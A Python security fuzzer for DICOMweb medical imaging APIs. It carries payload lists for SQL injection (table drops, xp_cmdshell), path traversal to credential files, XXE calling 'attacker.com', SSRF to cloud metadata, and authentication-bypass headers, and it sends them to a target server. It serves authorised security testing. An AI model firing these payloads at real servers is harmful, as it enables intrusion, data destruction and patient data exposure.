"""DICOMweb REST API Fuzzer.

Security testing for DICOMweb services implementing:
- WADO-RS (Web Access to DICOM Objects - RESTful Services)
- STOW-RS (Store Over the Web - RESTful Services)
- QIDO-RS (Query based on ID for DICOM Objects - RESTful Services)
- UPS-RS (Unified Procedure Step - RESTful Services)

Attack Vectors:
- Parameter injection (SQL, LDAP, XPath)
- Path traversal attacks
- Authentication bypass
- IDOR (Insecure Direct Object Reference)
- XXE (XML External Entity)
- SSRF (Server-Side Request Forgery)
- Multipart boundary manipulation

References:
- DICOM PS3.18 (Web Services) - https://dicom.nema.org/medical/dicom/current/output/html/part18.html
- DICOMweb Standard - https://www.dicomstandard.org/using/dicomweb
- OWASP Web Security Testing Guide
- CWE-89: SQL Injection
- CWE-22: Path Traversal
- CWE-918: SSRF

"""

from __future__ import annotations

import json
import logging
import random
import re
import string
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any
from urllib.parse import quote, urljoin

logger = logging.getLogger(__name__)


class DICOMwebService(Enum):
    """DICOMweb service types."""

    WADO_RS = "wado-rs"
    STOW_RS = "stow-rs"
    QIDO_RS = "qido-rs"
    UPS_RS = "ups-rs"
    WADO_URI = "wado-uri"  # Legacy


class AttackCategory(Enum):
    """Attack categories for DICOMweb fuzzing."""

    INJECTION = "injection"
    PATH_TRAVERSAL = "path_traversal"
    AUTHENTICATION = "authentication"
    IDOR = "idor"
    XXE = "xxe"
    SSRF = "ssrf"
    DOS = "dos"
    MULTIPART = "multipart"
    ENCODING = "encoding"
    PARAMETER_POLLUTION = "parameter_pollution"


class ResponseCode(Enum):
    """HTTP response code categories."""

    SUCCESS = "2xx"
    REDIRECT = "3xx"
    CLIENT_ERROR = "4xx"
    SERVER_ERROR = "5xx"
    TIMEOUT = "timeout"
    CONNECTION_ERROR = "connection_error"


@dataclass
class FuzzPayload:
    """A fuzzing payload for DICOMweb testing."""

    value: str
    category: AttackCategory
    description: str
    cwe_id: str | None = None
    expected_behavior: str = "reject"
    severity: str = "medium"


@dataclass
class FuzzResult:
    """Result of a DICOMweb fuzz test."""

    endpoint: str
    method: str
    payload: FuzzPayload | None
    status_code: int
    response_time_ms: float
    response_body: str = ""
    response_headers: dict[str, str] = field(default_factory=dict)
    anomaly_detected: bool = False
    anomaly_description: str = ""
    timestamp: float = 0.0

    def __post_init__(self) -> None:
        if not self.timestamp:
            self.timestamp = time.time()

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "endpoint": self.endpoint,
            "method": self.method,
            "payload_category": self.payload.category.value if self.payload else None,
            "status_code": self.status_code,
            "response_time_ms": self.response_time_ms,
            "anomaly_detected": self.anomaly_detected,
            "anomaly_description": self.anomaly_description,
            "timestamp": self.timestamp,
        }


class PayloadGenerator:
    """Generates fuzzing payloads for DICOMweb testing."""

    # SQL Injection payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE studies;--",
        "1' AND '1'='1",
        "' UNION SELECT NULL,NULL,NULL--",
        "1; WAITFOR DELAY '0:0:5'--",
        "' OR 1=1#",
        "admin'--",
        "1' ORDER BY 1--",
        "1' UNION SELECT @@version--",
        "'; EXEC xp_cmdshell('whoami');--",
    ]

    # LDAP Injection payloads
    LDAP_INJECTION_PAYLOADS = [
        "*",
        "*()|&'",
        "*)(objectClass=*",
        "*)(&",
        "*))%00",
        "*(|(objectclass=*))",
        "*)(uid=*))(|(uid=*",
    ]

    # Path traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/etc/passwd%00.dcm",
        "....\\....\\....\\windows\\system.ini",
    ]

    # XXE payloads
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
    ]

    # SSRF payloads
    SSRF_PAYLOADS = [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",  # GCP metadata
        "http://169.254.169.254/metadata/v1/",  # DigitalOcean
        "http://0.0.0.0/",
        "file:///etc/passwd",
        "gopher://localhost:6379/_INFO",
    ]

    # DICOM-specific malicious UIDs
    MALICIOUS_UIDS = [
        "1.2.3'",
        "1.2.3;DROP TABLE",
        "../../../etc/passwd",
        "1" * 65,  # Oversized UID
        "1.2.3.4.5.6.7.8.9" + ".0" * 50,  # Very long UID
        "",
        "NULL",
        "undefined",
        "-1",
        "1.2.840.10008.5.1.4.1.1.2\x00",  # Null byte
    ]

    # Buffer overflow payloads
    BUFFER_OVERFLOW_PAYLOADS = [
        "A" * 256,
        "A" * 1024,
        "A" * 4096,
        "A" * 65536,
        "%s" * 100,
        "%n" * 100,
        "%x" * 100,
    ]

    # Encoding bypass payloads
    ENCODING_BYPASS_PAYLOADS = [
        "%00",
        "%0d%0a",
        "%09",
        "%20",
        "\r\n",
        "\x00",
        "%252e%252e%252f",  # Double URL encoding
        "%%32%65",  # Mixed encoding
    ]

    @classmethod
    def get_sql_injection_payloads(cls) -> list[FuzzPayload]:
        """Get SQL injection payloads."""
        return [
            FuzzPayload(
                value=p,
                category=AttackCategory.INJECTION,
                description="SQL Injection attempt",
                cwe_id="CWE-89",
                severity="high",
            )
            for p in cls.SQL_INJECTION_PAYLOADS
        ]

    @classmethod
    def get_path_traversal_payloads(cls) -> list[FuzzPayload]:
        """Get path traversal payloads."""
        return [
            FuzzPayload(
                value=p,
                category=AttackCategory.PATH_TRAVERSAL,
                description="Path traversal attempt",
                cwe_id="CWE-22",
                severity="high",
            )
            for p in cls.PATH_TRAVERSAL_PAYLOADS
        ]

    @classmethod
    def get_xxe_payloads(cls) -> list[FuzzPayload]:
        """Get XXE payloads."""
        return [
            FuzzPayload(
                value=p,
                category=AttackCategory.XXE,
                description="XXE injection attempt",
                cwe_id="CWE-611",
                severity="critical",
            )
            for p in cls.XXE_PAYLOADS
        ]

    @classmethod
    def get_ssrf_payloads(cls) -> list[FuzzPayload]:
        """Get SSRF payloads."""
        return [
            FuzzPayload(
                value=p,
                category=AttackCategory.SSRF,
                description="SSRF attempt",
                cwe_id="CWE-918",
                severity="high",
            )
            for p in cls.SSRF_PAYLOADS
        ]

    @classmethod
    def get_malicious_uids(cls) -> list[FuzzPayload]:
        """Get malicious DICOM UID payloads."""
        return [
            FuzzPayload(
                value=p,
                category=AttackCategory.INJECTION,
                description="Malicious DICOM UID",
                cwe_id="CWE-20",
                severity="medium",
            )
            for p in cls.MALICIOUS_UIDS
        ]

    @classmethod
    def get_buffer_overflow_payloads(cls) -> list[FuzzPayload]:
        """Get buffer overflow payloads."""
        return [
            FuzzPayload(
                value=p,
                category=AttackCategory.DOS,
                description="Buffer overflow attempt",
                cwe_id="CWE-120",
                severity="critical",
            )
            for p in cls.BUFFER_OVERFLOW_PAYLOADS
        ]

    @classmethod
    def get_all_payloads(cls) -> list[FuzzPayload]:
        """Get all fuzzing payloads."""
        payloads = []
        payloads.extend(cls.get_sql_injection_payloads())
        payloads.extend(cls.get_path_traversal_payloads())
        payloads.extend(cls.get_xxe_payloads())
        payloads.extend(cls.get_ssrf_payloads())
        payloads.extend(cls.get_malicious_uids())
        payloads.extend(cls.get_buffer_overflow_payloads())
        return payloads


class MultipartGenerator:
    """Generate malformed multipart/related requests for STOW-RS."""

    @staticmethod
    def generate_valid_boundary() -> str:
        """Generate a valid multipart boundary."""
        return "".join(random.choices(string.ascii_letters + string.digits, k=32))

    @staticmethod
    def generate_stow_request(
        dicom_data: bytes,
        boundary: str | None = None,
        malformed: bool = False,
        malform_type: str = "",
    ) -> tuple[bytes, str]:
        """Generate a STOW-RS multipart request.

        Args:
            dicom_data: DICOM file bytes
            boundary: Multipart boundary (auto-generated if None)
            malformed: Whether to create malformed request
            malform_type: Type of malformation

        Returns:
            Tuple of (request_body, content_type)

        """
        if not boundary:
            boundary = MultipartGenerator.generate_valid_boundary()

        content_type = (
            f'multipart/related; type="application/dicom"; boundary={boundary}'
        )

        if malformed:
            if malform_type == "missing_boundary":
                boundary = ""
            elif malform_type == "broken_boundary":
                boundary = boundary[:10]  # Truncated
            elif malform_type == "nested_boundary":
                boundary = f"--{boundary}--{boundary}"
            elif malform_type == "unicode_boundary":
                boundary = f"{boundary}\u0000\u0001"
            elif malform_type == "crlf_injection":
                boundary = f"{boundary}\r\nX-Injected: true"

        body = b""
        body += f"--{boundary}\r\n".encode()
        body += b"Content-Type: application/dicom\r\n"
        body += b"Content-Transfer-Encoding: binary\r\n"
        body += b"\r\n"
        body += dicom_data
        body += b"\r\n"
        body += f"--{boundary}--\r\n".encode()

        return body, content_type

    @staticmethod
    def generate_malformed_requests(
        dicom_data: bytes,
    ) -> list[tuple[bytes, str, str]]:
        """Generate various malformed multipart requests.

        Returns:
            List of (body, content_type, description) tuples

        """
        requests = []
        boundary = MultipartGenerator.generate_valid_boundary()

        # Missing boundary terminator
        body = f"--{boundary}\r\n".encode()
        body += b"Content-Type: application/dicom\r\n\r\n"
        body += dicom_data
        requests.append(
            (body, f"multipart/related; boundary={boundary}", "missing_terminator")
        )

        # Invalid content type
        body, _ = MultipartGenerator.generate_stow_request(dicom_data, boundary)
        requests.append((body, "application/octet-stream", "wrong_content_type"))

        # Duplicate boundaries
        body = f"--{boundary}\r\n--{boundary}\r\n".encode()
        body += b"Content-Type: application/dicom\r\n\r\n"
        body += dicom_data
        body += f"\r\n--{boundary}--\r\n".encode()
        requests.append(
            (body, f"multipart/related; boundary={boundary}", "duplicate_boundary")
        )

        # Oversized part header
        huge_header = "X-Custom: " + "A" * 10000
        body = f"--{boundary}\r\n".encode()
        body += f"{huge_header}\r\n".encode()
        body += b"Content-Type: application/dicom\r\n\r\n"
        body += dicom_data
        body += f"\r\n--{boundary}--\r\n".encode()
        requests.append(
            (body, f"multipart/related; boundary={boundary}", "oversized_header")
        )

        # Empty part
        body = f"--{boundary}\r\n".encode()
        body += b"Content-Type: application/dicom\r\n\r\n"
        body += b""  # Empty
        body += f"\r\n--{boundary}--\r\n".encode()
        requests.append((body, f"multipart/related; boundary={boundary}", "empty_part"))

        return requests


@dataclass
class DICOMwebEndpoint:
    """A DICOMweb API endpoint."""

    path_template: str
    method: str
    service: DICOMwebService
    parameters: list[str] = field(default_factory=list)
    required_params: list[str] = field(default_factory=list)
    description: str = ""


class DICOMwebEndpoints:
    """Standard DICOMweb API endpoints."""

    ENDPOINTS = [
        # QIDO-RS - Query endpoints
        DICOMwebEndpoint(
            path_template="/studies",
            method="GET",
            service=DICOMwebService.QIDO_RS,
            parameters=[
                "PatientID",
                "PatientName",
                "StudyDate",
                "StudyInstanceUID",
                "limit",
                "offset",
            ],
            description="Search for studies",
        ),
        DICOMwebEndpoint(
            path_template="/studies/{StudyInstanceUID}/series",
            method="GET",
            service=DICOMwebService.QIDO_RS,
            parameters=["Modality", "SeriesInstanceUID", "SeriesNumber"],
            description="Search for series in a study",
        ),
        DICOMwebEndpoint(
            path_template="/studies/{StudyInstanceUID}/series/{SeriesInstanceUID}/instances",
            method="GET",
            service=DICOMwebService.QIDO_RS,
            parameters=["SOPInstanceUID", "InstanceNumber"],
            description="Search for instances in a series",
        ),
        # WADO-RS - Retrieve endpoints
        DICOMwebEndpoint(
            path_template="/studies/{StudyInstanceUID}",
            method="GET",
            service=DICOMwebService.WADO_RS,
            required_params=["StudyInstanceUID"],
            description="Retrieve a study",
        ),
        DICOMwebEndpoint(
            path_template="/studies/{StudyInstanceUID}/series/{SeriesInstanceUID}",
            method="GET",
            service=DICOMwebService.WADO_RS,
            required_params=["StudyInstanceUID", "SeriesInstanceUID"],
            description="Retrieve a series",
        ),
        DICOMwebEndpoint(
            path_template="/studies/{StudyInstanceUID}/series/{SeriesInstanceUID}/instances/{SOPInstanceUID}",
            method="GET",
            service=DICOMwebService.WADO_RS,
            required_params=["StudyInstanceUID", "SeriesInstanceUID", "SOPInstanceUID"],
            description="Retrieve an instance",
        ),
        DICOMwebEndpoint(
            path_template="/studies/{StudyInstanceUID}/series/{SeriesInstanceUID}/instances/{SOPInstanceUID}/frames/{FrameNumber}",
            method="GET",
            service=DICOMwebService.WADO_RS,
            description="Retrieve specific frames",
        ),
        DICOMwebEndpoint(
            path_template="/studies/{StudyInstanceUID}/series/{SeriesInstanceUID}/instances/{SOPInstanceUID}/rendered",
            method="GET",
            service=DICOMwebService.WADO_RS,
            parameters=["viewport", "window", "quality"],
            description="Retrieve rendered instance",
        ),
        DICOMwebEndpoint(
            path_template="/studies/{StudyInstanceUID}/series/{SeriesInstanceUID}/instances/{SOPInstanceUID}/metadata",
            method="GET",
            service=DICOMwebService.WADO_RS,
            description="Retrieve instance metadata",
        ),
        # STOW-RS - Store endpoints
        DICOMwebEndpoint(
            path_template="/studies",
            method="POST",
            service=DICOMwebService.STOW_RS,
            description="Store DICOM objects",
        ),
        DICOMwebEndpoint(
            path_template="/studies/{StudyInstanceUID}",
            method="POST",
            service=DICOMwebService.STOW_RS,
            description="Store DICOM objects to specific study",
        ),
        # Delete endpoints
        DICOMwebEndpoint(
            path_template="/studies/{StudyInstanceUID}",
            method="DELETE",
            service=DICOMwebService.WADO_RS,
            description="Delete a study",
        ),
    ]


@dataclass
class DICOMwebFuzzerConfig:
    """Configuration for DICOMweb fuzzer."""

    base_url: str = "http://localhost:8080/dicomweb"
    timeout: float = 30.0
    max_iterations: int = 1000
    auth_header: str = ""
    auth_token: str = ""
    verify_ssl: bool = False
    user_agent: str = "DICOM-Fuzzer/1.5.0"
    output_dir: Path = field(default_factory=lambda: Path("dicomweb_fuzzer_output"))


class DICOMwebFuzzer:
    """Security fuzzer for DICOMweb REST APIs.

    Tests WADO-RS, STOW-RS, QIDO-RS, and UPS-RS implementations
    for security vulnerabilities.
    """

    def __init__(
        self,
        config: DICOMwebFuzzerConfig | None = None,
    ) -> None:
        self.config = config or DICOMwebFuzzerConfig()
        self.config.output_dir.mkdir(parents=True, exist_ok=True)

        self.payload_generator = PayloadGenerator()
        self.results: list[FuzzResult] = []
        self.anomalies: list[FuzzResult] = []

        # Statistics
        self.total_requests = 0
        self.total_anomalies = 0
        self.response_times: list[float] = []

        # HTTP client (using requests if available, otherwise mock)
        self._http_client = self._setup_http_client()

    def _setup_http_client(self) -> Any:
        """Setup HTTP client."""
        try:
            import requests

            session = requests.Session()
            session.verify = self.config.verify_ssl
            session.headers["User-Agent"] = self.config.user_agent

            if self.config.auth_header and self.config.auth_token:
                session.headers[self.config.auth_header] = self.config.auth_token

            return session
        except ImportError:
            logger.warning("[-] requests library not available, using mock client")
            return None

    def _make_request(
        self,
        method: str,
        url: str,
        params: dict[str, str] | None = None,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, str, dict[str, str], float]:
        """Make an HTTP request.

        Returns:
            Tuple of (status_code, body, headers, response_time_ms)

        """
        start_time = time.time()

        if not self._http_client:
            # Mock response for testing without requests library
            return 200, "{}", {}, 0.0

        try:
            response = self._http_client.request(
                method=method,
                url=url,
                params=params,
                data=data,
                headers=headers,
                timeout=self.config.timeout,
            )
            response_time = (time.time() - start_time) * 1000

            return (
                response.status_code,
                response.text[:10000],  # Limit response size
                dict(response.headers),
                response_time,
            )
        except Exception as e:
            response_time = (time.time() - start_time) * 1000
            return 0, str(e), {}, response_time

    def _check_anomaly(
        self,
        status_code: int,
        response_body: str,
        response_time_ms: float,
        payload: FuzzPayload | None,
    ) -> tuple[bool, str]:
        """Check if response indicates an anomaly.

        Returns:
            Tuple of (is_anomaly, description)

        """
        # Server error is always interesting
        if 500 <= status_code < 600:
            return True, f"Server error: HTTP {status_code}"

        # Very slow response might indicate DoS
        if response_time_ms > 10000:
            return True, f"Slow response: {response_time_ms}ms"

        # Check for error message leakage
        error_patterns = [
            r"SQL syntax",
            r"mysql_",
            r"ORA-\d+",
            r"postgres",
            r"sqlite",
            r"stack trace",
            r"Exception in",
            r"at line \d+",
            r"file:///",
            r"/etc/passwd",
            r"root:x:",
            r"System\.IO",
            r"java\.lang\.",
        ]

        for pattern in error_patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                return True, f"Information leakage detected: {pattern}"

        # Check for reflection of injection payload
        if payload and payload.value in response_body:
            if payload.category in (AttackCategory.INJECTION, AttackCategory.XXE):
                return True, "Payload reflected in response"

        # Success on DELETE without auth might be IDOR
        if status_code == 200 and payload and "DELETE" in str(payload):
            return True, "Successful DELETE operation - check authorization"

        return False, ""

    def fuzz_endpoint(
        self,
        endpoint: DICOMwebEndpoint,
        base_params: dict[str, str] | None = None,
    ) -> list[FuzzResult]:
        """Fuzz a single DICOMweb endpoint."""
        results: list[FuzzResult] = []
        base_params = base_params or {}

        # Get payloads based on endpoint type
        payloads = PayloadGenerator.get_all_payloads()

        # Build base URL
        path = endpoint.path_template
        for param in endpoint.required_params:
            if param in base_params:
                path = path.replace(f"{{{param}}}", base_params[param])
            else:
                # Use valid-looking UID
                path = path.replace(f"{{{param}}}", "1.2.840.10008.1.2")

        url = urljoin(self.config.base_url, path)

        # Test each parameter with each payload
        for param in endpoint.parameters:
            for payload in payloads:
                params = dict(base_params)
                params[param] = payload.value

                status_code, body, headers, response_time = self._make_request(
                    method=endpoint.method,
                    url=url,
                    params=params if endpoint.method == "GET" else None,
                    data=payload.value.encode() if endpoint.method == "POST" else None,
                )

                is_anomaly, anomaly_desc = self._check_anomaly(
                    status_code, body, response_time, payload
                )

                result = FuzzResult(
                    endpoint=endpoint.path_template,
                    method=endpoint.method,
                    payload=payload,
                    status_code=status_code,
                    response_time_ms=response_time,
                    response_body=body[:1000] if is_anomaly else "",
                    response_headers=headers if is_anomaly else {},
                    anomaly_detected=is_anomaly,
                    anomaly_description=anomaly_desc,
                )

                results.append(result)
                self.results.append(result)
                self.total_requests += 1

                if is_anomaly:
                    self.anomalies.append(result)
                    self.total_anomalies += 1
                    logger.warning(
                        f"[!] Anomaly: {endpoint.path_template} - {anomaly_desc}"
                    )

                self.response_times.append(response_time)

        # Also test path injection for URL parameters
        for required_param in endpoint.required_params:
            for payload in PayloadGenerator.get_path_traversal_payloads():
                fuzzed_path = endpoint.path_template.replace(
                    f"{{{required_param}}}", quote(payload.value, safe="")
                )
                url = urljoin(self.config.base_url, fuzzed_path)

                status_code, body, headers, response_time = self._make_request(
                    method=endpoint.method,
                    url=url,
                )

                is_anomaly, anomaly_desc = self._check_anomaly(
                    status_code, body, response_time, payload
                )

                result = FuzzResult(
                    endpoint=fuzzed_path,
                    method=endpoint.method,
                    payload=payload,
                    status_code=status_code,
                    response_time_ms=response_time,
                    response_body=body[:1000] if is_anomaly else "",
                    anomaly_detected=is_anomaly,
                    anomaly_description=anomaly_desc,
                )

                results.append(result)
                self.results.append(result)
                self.total_requests += 1

                if is_anomaly:
                    self.anomalies.append(result)
                    self.total_anomalies += 1

        return results

    def fuzz_stow_rs(
        self,
        dicom_data: bytes | None = None,
    ) -> list[FuzzResult]:
        """Fuzz STOW-RS store endpoint with malformed multipart requests."""
        results: list[FuzzResult] = []

        if not dicom_data:
            # Generate minimal DICOM for testing
            dicom_data = b"DICM" + b"\x00" * 128

        # Generate malformed multipart requests
        malformed_requests = MultipartGenerator.generate_malformed_requests(dicom_data)

        url = urljoin(self.config.base_url, "/studies")

        for body, content_type, description in malformed_requests:
            status_code, response, headers, response_time = self._make_request(
                method="POST",
                url=url,
                data=body,
                headers={"Content-Type": content_type},
            )

            payload = FuzzPayload(
                value=description,
                category=AttackCategory.MULTIPART,
                description=f"Malformed multipart: {description}",
                severity="medium",
            )

            is_anomaly, anomaly_desc = self._check_anomaly(
                status_code, response, response_time, payload
            )

            result = FuzzResult(
                endpoint="/studies",
                method="POST",
                payload=payload,
                status_code=status_code,
                response_time_ms=response_time,
                response_body=response[:1000] if is_anomaly else "",
                anomaly_detected=is_anomaly,
                anomaly_description=anomaly_desc or description,
            )

            results.append(result)
            self.results.append(result)
            self.total_requests += 1

            if is_anomaly:
                self.anomalies.append(result)
                self.total_anomalies += 1

        return results

    def fuzz_authentication(self) -> list[FuzzResult]:
        """Test authentication bypass vulnerabilities."""
        results: list[FuzzResult] = []

        # Test endpoints that should require authentication
        protected_endpoints = [
            ("/studies", "GET"),
            ("/studies", "POST"),
            ("/studies/1.2.3", "DELETE"),
        ]

        # Auth bypass techniques
        bypass_headers: list[dict[str, str]] = [
            {},  # No auth
            {"Authorization": ""},  # Empty auth
            {"Authorization": "Bearer invalid"},  # Invalid token
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
            {"X-Forwarded-For": "127.0.0.1"},  # IP spoofing
            {"X-Forwarded-Host": "localhost"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
        ]

        for path, method in protected_endpoints:
            url = urljoin(self.config.base_url, path)

            for headers in bypass_headers:
                # Temporarily remove auth
                if self._http_client:
                    original_auth = self._http_client.headers.get("Authorization")
                    if "Authorization" in self._http_client.headers:
                        del self._http_client.headers["Authorization"]

                status_code, body, resp_headers, response_time = self._make_request(
                    method=method,
                    url=url,
                    headers=headers,
                )

                # Restore auth
                if self._http_client and original_auth:
                    self._http_client.headers["Authorization"] = original_auth

                # 200/201 without proper auth is an anomaly
                is_anomaly = status_code in (200, 201, 204)
                anomaly_desc = (
                    f"Authentication bypass - {status_code} with headers: {headers}"
                    if is_anomaly
                    else ""
                )

                payload = FuzzPayload(
                    value=str(headers),
                    category=AttackCategory.AUTHENTICATION,
                    description="Authentication bypass attempt",
                    cwe_id="CWE-287",
                    severity="critical",
                )

                result = FuzzResult(
                    endpoint=path,
                    method=method,
                    payload=payload,
                    status_code=status_code,
                    response_time_ms=response_time,
                    anomaly_detected=is_anomaly,
                    anomaly_description=anomaly_desc,
                )

                results.append(result)
                self.results.append(result)
                self.total_requests += 1

                if is_anomaly:
                    self.anomalies.append(result)
                    self.total_anomalies += 1
                    logger.warning(f"[!] Auth bypass: {path} - {anomaly_desc}")

        return results

    def run_full_campaign(self) -> dict[str, Any]:
        """Run a full fuzzing campaign against all DICOMweb endpoints."""
        logger.info(
            f"[+] Starting DICOMweb fuzzing campaign against {self.config.base_url}"
        )

        # Test all standard endpoints
        for endpoint in DICOMwebEndpoints.ENDPOINTS:
            logger.info(f"[i] Fuzzing {endpoint.method} {endpoint.path_template}")
            self.fuzz_endpoint(endpoint)

        # Test STOW-RS multipart
        logger.info("[i] Fuzzing STOW-RS multipart handling")
        self.fuzz_stow_rs()

        # Test authentication
        logger.info("[i] Testing authentication bypass")
        self.fuzz_authentication()

        return self.get_statistics()

    def get_statistics(self) -> dict[str, Any]:
        """Get fuzzing statistics."""
        return {
            "total_requests": self.total_requests,
            "total_anomalies": self.total_anomalies,
            "anomaly_rate": self.total_anomalies / self.total_requests
            if self.total_requests > 0
            else 0,
            "avg_response_time_ms": sum(self.response_times) / len(self.response_times)
            if self.response_times
            else 0,
            "max_response_time_ms": max(self.response_times)
            if self.response_times
            else 0,
            "anomalies_by_category": self._count_by_category(),
        }

    def _count_by_category(self) -> dict[str, int]:
        """Count anomalies by attack category."""
        counts: dict[str, int] = {}
        for result in self.anomalies:
            if result.payload:
                cat = result.payload.category.value
                counts[cat] = counts.get(cat, 0) + 1
        return counts

    def generate_report(self) -> str:
        """Generate markdown security report."""
        stats = self.get_statistics()

        md = """# DICOMweb Security Testing Report

## Executive Summary

| Metric | Value |
|--------|-------|
"""
        md += f"| Total Requests | {stats['total_requests']} |\n"
        md += f"| Anomalies Detected | {stats['total_anomalies']} |\n"
        md += f"| Anomaly Rate | {stats['anomaly_rate']:.2%} |\n"
        md += f"| Avg Response Time | {stats['avg_response_time_ms']:.1f}ms |\n"
        md += f"| Max Response Time | {stats['max_response_time_ms']:.1f}ms |\n"

        md += """
## Anomalies by Category

| Category | Count |
|----------|-------|
"""
        for category, count in stats.get("anomalies_by_category", {}).items():
            md += f"| {category} | {count} |\n"

        md += """
## Detailed Findings

"""
        for i, result in enumerate(self.anomalies[:50], 1):
            md += f"""### Finding {i}

| Attribute | Value |
|-----------|-------|
| Endpoint | `{result.endpoint}` |
| Method | {result.method} |
| Status Code | {result.status_code} |
| Response Time | {result.response_time_ms:.1f}ms |
"""
            if result.payload:
                md += f"| Attack Category | {result.payload.category.value} |\n"
                md += f"| CWE | {result.payload.cwe_id or 'N/A'} |\n"
                md += f"| Severity | {result.payload.severity} |\n"

            md += f"""
**Description:** {result.anomaly_description}

---

"""

        md += """
## Attack Categories Tested

- **Injection**: SQL, LDAP, XPath injection
- **Path Traversal**: Directory traversal, path manipulation
- **Authentication**: Auth bypass, token manipulation
- **IDOR**: Insecure direct object reference
- **XXE**: XML external entity injection
- **SSRF**: Server-side request forgery
- **Multipart**: Boundary manipulation, malformed requests
- **DoS**: Buffer overflow, resource exhaustion

## References

- DICOM PS3.18 (Web Services)
- OWASP Web Security Testing Guide
- CWE/CAPEC Vulnerability Database

*Generated by DICOM Fuzzer DICOMweb Security Testing Module*
"""
        return md

    def save_report(self, path: Path | str) -> Path:
        """Save report to file."""
        path = Path(path)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(self.generate_report())
        return path

    def save_results(self, path: Path | str) -> Path:
        """Save detailed results as JSON."""
        path = Path(path)
        path.parent.mkdir(parents=True, exist_ok=True)

        data = {
            "statistics": self.get_statistics(),
            "anomalies": [r.to_dict() for r in self.anomalies],
            "config": {
                "base_url": self.config.base_url,
                "timeout": self.config.timeout,
            },
        }

        with open(path, "w") as f:
            json.dump(data, f, indent=2, default=str)

        return path


def create_sample_fuzzer(
    base_url: str = "http://localhost:8080/dicomweb",
) -> DICOMwebFuzzer:
    """Create a sample DICOMweb fuzzer."""
    config = DICOMwebFuzzerConfig(
        base_url=base_url,
        timeout=10.0,
        max_iterations=100,
    )
    return DICOMwebFuzzer(config=config)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)

    # Create fuzzer with mock target
    fuzzer = create_sample_fuzzer()

    print(f"[+] Fuzzer initialized for {fuzzer.config.base_url}")
    print(f"[+] Total payloads available: {len(PayloadGenerator.get_all_payloads())}")

    # Run sample tests
    print("\n[+] Testing QIDO-RS endpoint...")
    endpoint = DICOMwebEndpoints.ENDPOINTS[0]  # Studies search
    results = fuzzer.fuzz_endpoint(endpoint)
    print(f"[+] Tested with {len(results)} requests")

    # Print statistics
    print("\n[+] Statistics:")
    print(json.dumps(fuzzer.get_statistics(), indent=2))
